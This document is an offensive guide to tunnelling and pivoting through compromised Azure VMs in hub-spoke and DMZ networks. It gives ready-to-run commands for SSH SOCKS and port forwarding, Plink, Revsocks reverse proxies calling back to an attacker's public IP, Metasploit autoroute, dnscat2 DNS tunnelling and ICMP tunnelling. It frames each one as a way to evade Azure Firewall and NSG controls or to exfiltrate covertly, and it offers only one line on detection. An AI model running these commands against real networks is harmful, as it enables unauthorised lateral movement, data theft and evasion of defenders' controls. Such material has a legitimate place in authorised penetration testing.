# Dynamic SSH Tunnelling

**🔒 Attacking Azure: Tunneling & Port Forwarding Techniques in Hub-Spoke/DMZ Environments**

In Azure environments, attackers often land on a compromised Virtual
Machine (VM) in a **Spoke VNET** or **DMZ subnet**. To pivot deeper into
the **Hub VNET** or internal networks protected by **Azure Firewall**,
various tunneling techniques can be used for lateral movement and
exfiltration, while bypassing network security boundaries.

This guide outlines **SSH tunneling**, **SOCKS proxies**, **reverse
proxy tools**, and **covert channels** (like DNS and ICMP tunneling) in
the context of **Azure penetration testing**.

------------------------------------------------------------------------

**1. 🔁 Dynamic SSH Tunneling (SOCKS Proxy)**

**Scenario:**

You're inside a Linux VM within a **DMZ subnet** and want to browse
internal services inside the **Hub VNET**.

**Technique:**

ssh -D 7000 azureuser@10.0.0.4

- -D 7000: Creates a local SOCKS5 proxy on port 7000.

- Configure your browser on **Kali** or attacker host to use SOCKS5
  127.0.0.1:7000.

- Use proxychains or manual browser proxy to reach internal IPs (e.g.,
  10.1.0.10:443).

✅ **Use Case**: Bypass **Azure Firewall** egress rules by relaying
traffic through an allowed SSH port.

------------------------------------------------------------------------

**2. 🔃 Local Port Forwarding**

**Scenario:**

You want to access an internal Azure service (e.g., internal web server
on port 80) reachable only by a compromised VM.

ssh -L 8080:10.1.0.10:80 azureuser@10.0.0.4

- Maps localhost:8080 to 10.1.0.10:80 via SSH tunnel.

- Access the internal web server through http://127.0.0.1:8080.

✅ **Use Case**: Pivot into **private Hub VNET services** while evading
NSGs or firewall constraints.

------------------------------------------------------------------------

**3. 🔄 Local Port Forwarding (Plink on Windows)**

Use **Plink.exe** (PuTTY CLI) for local forwarding in Azure VM on
Windows:

plink.exe -L 8080:10.1.0.10:80 azureuser@10.0.0.4

✅ Ideal for Windows jump boxes inside the **Hub VNET** or **bastion
DMZs**.

------------------------------------------------------------------------

**4. 🌐 Dynamic Port Forwarding with Plink (SOCKS Proxy)**

plink.exe -D 8000 azureuser@10.0.0.4

- Acts as a SOCKS5 proxy.

- Configure browser/proxychains to route traffic through 127.0.0.1:8000.

------------------------------------------------------------------------

**5. 🌀 Reverse SOCKS Proxy with Revsocks**

**Scenario:**

You're on a **Windows attack VM** and want to proxy through a **Linux VM
in Azure** to reach internal targets.

**On Attacker (Windows):**

revsocks_windows_amd64.exe -listen :8443 -socks 0.0.0.0:1080 -pass test

**On Azure Linux VM (Ubuntu in DMZ):**

./revsocks_linux_amd64 -connect YOUR_PUBLIC_IP:8443 -pass test

- Set browser or proxychains to 127.0.0.1:1080 SOCKS5 proxy.

- Reach internal subnets (e.g., Hub VNET 10.1.0.0/16) from the outside.

✅ Evades NSGs by establishing reverse connection from trusted Azure VM
to external attacker.

------------------------------------------------------------------------

**6. 🎯 Metasploit SOCKS Proxy & Routing**

**Scenario:**

You gain Meterpreter access on an Azure VM. You want to route traffic
into internal segments.

use post/multi/manage/autoroute

set subnet 10.1.0.0

run

use auxiliary/server/socks_proxy

set srvhost 127.0.0.1

set srvport 1080

run

- Use proxychains through Metasploit’s proxy to access internal
  services.

- Deprecated SOCKS4a/5 modules can still be used but should be replaced
  with modern equivalents.

------------------------------------------------------------------------

**7. 🌐 DNScat2 – Covert DNS Tunneling**

DNS egress is often open in Azure. Use this to create tunnels via DNS
(TCP/53).

**On Attacker (Kali in local lab):**

apt install dnscat2

ruby dnscat2.rb

**On Azure VM (Ubuntu):**

git clone https://github.com/iagox86/dnscat2.git

cd client && make

./dnscat --dns=server=YOUR_KALI_IP,port=53

- Establishes a DNS tunnel over port 53.

- Use built-in DNScat2 shell or TCP port forwards:

listen 127.0.0.1:8888 10.1.0.10:22

ssh user@127.0.0.1 -p 8888

✅ **Use Case**: Bypass Azure Firewall rules allowing only DNS traffic.

**8. 📡 ICMP Tunneling (ICMPTunnel)**

**Scenario:**

Azure NSGs allow ICMP, and you want to tunnel traffic over it.

**On Azure Linux VM (Server):**

git clone https://github.com/jamesbarlow/icmptunnel.git

cd icmptunnel && make

./icmptunnel -s

/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0

**On Attacker VM (Kali):**

./icmptunnel 10.0.0.4

/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0

ssh user@10.0.0.1

✅ Use when **ICMP echo** is permitted by Azure NSG and Firewall rules.

**🔐 Considerations for Azure Environments**

| **Area** | **Consideration** |
|----|----|
| **Azure Firewall** | Can block or allow based on FQDNs and ports; tunneling may bypass inspection. |
| **Hub-Spoke Topology** | Tunneling helps bypass NSGs in Hub VNET or DMZ restrictions in Spoke VNET. |
| **NSGs** | Typically allow outbound SSH, DNS, and ICMP, which can be abused. |
| **Monitoring** | Use Azure Defender for DNS, NSG Flow Logs, and Sentinel for detection. |

**✅ Summary**

| **Technique** | **Protocol** | **Direction** | **Covert** | **Azure Use Case** |
|----|----|----|----|----|
| SSH -D (SOCKS) | TCP | Outbound | ❌ | Proxy through internal jump box |
| SSH -L (Local) | TCP | Outbound | ❌ | Local browser access to internal web apps |
| Revsocks | TCP | Reverse | ❌ | Reverse tunneling from Azure to attacker |
| DNScat2 | DNS | Reverse | ✅ | DNS egress tunneling |
| ICMP Tunnel | ICMP | Reverse | ✅ | Bypass all TCP/UDP-based inspection |
| Metasploit SOCKS | TCP | Outbound | ❌ | Post-exploitation pivoting with proxychains |
